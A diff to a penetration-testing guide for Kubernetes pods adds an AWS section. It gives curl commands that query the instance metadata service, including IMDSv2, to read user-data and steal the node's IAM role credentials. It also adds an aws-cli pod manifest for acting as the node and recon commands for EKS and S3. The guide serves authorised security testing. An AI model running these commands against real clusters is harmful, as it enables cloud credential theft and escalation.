@@ -77,11 +77,60 @@ Connection received on 10.0.0.162 42035
 ## Cloud metadata
 If the cluster is cloud hosted, try to access the cloud metadata service. You might get access to the IAM credentials associated with the node or even just find a cloud IAM credential created specifically for that pod. In either case, this can be your path to escalate within the cluster, within the cloud environment, or in both.
 ### AWS
+**Test to see if you have access to the metadata service:**
 ```bash
-curl http://169.254.169.254/latest/user-data #Look for credentials or bucket names
+curl http://169.254.169.254/latest/meta-data
+#IMDSv2
+TOKEN="$(curl --silent -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 600" http://169.254.169.254/latest/api/token)"
+curl --silent -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data"
+```
+
+
+**See if any instance user-data is populated. Look for credentials, kubelet info, or bucket names**
+```bash
+curl http://169.254.169.254/latest/user-data
+```
+
+**If an IAM role is assigned to the node, you can access the node's identify token**
+```
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ #List's role name
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] # Get creds
 ```
+
+**Launch a new pod with the aws-cli**
+
+If you can query the metadata service, you can proceed with curl, but I suggest deploying another pod with the `amazon/aws-cli` image. This allows you to use `aws` as the node.
+Something like this: 
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nothing-allowed-awscli-pod
+  labels:
+    app: pentest
+spec:
+  containers:
+  - name: nothing-allowed-awscli-pod
+    image: amazon/aws-cli
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+```
+
+**Verify you are the node**
+```
+aws sts get-caller-identity
+```
+
+**Some recon ideas**
+```
+yum install jq
+aws eks get-token --cluster-name clusterName --region us-east-1 | jq .
+aws eks describe-cluster --name clusterName
+aws s3 ls
+
+```
+
 ### GCP
 Test to see if you have access to the metadata service:
 ```
